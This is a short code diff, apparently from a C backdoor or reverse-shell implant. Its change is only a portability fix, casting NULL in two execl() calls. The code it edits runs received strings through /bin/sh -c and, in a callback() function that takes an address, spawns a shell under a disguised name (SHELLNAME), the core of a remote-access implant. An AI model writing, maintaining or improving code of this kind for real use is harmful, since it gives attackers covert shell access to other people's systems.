@@ -236,7 +236,8 @@ double_fork(u_char *s, int action)
                 case DO_CALLBACK:
                         callback(s);
                 case DO_COMMAND:
-                        if (-1 == execl("/bin/sh", "sh", "-c", s, NULL))
+                        if (-1 == execl("/bin/sh", "sh", "-c", s,
+                                                (char *)(NULL))
                                 exit(9);
         }
         exit(0);
@@ -294,6 +295,6 @@ callback(u_char *addr)
                 close(s);
 
         /* Exec a shell */
-        if (-1 == execl("/bin/sh", SHELLNAME, NULL))
+        if (-1 == execl("/bin/sh", SHELLNAME, (char *)NULL))
                 exit(12);
 }
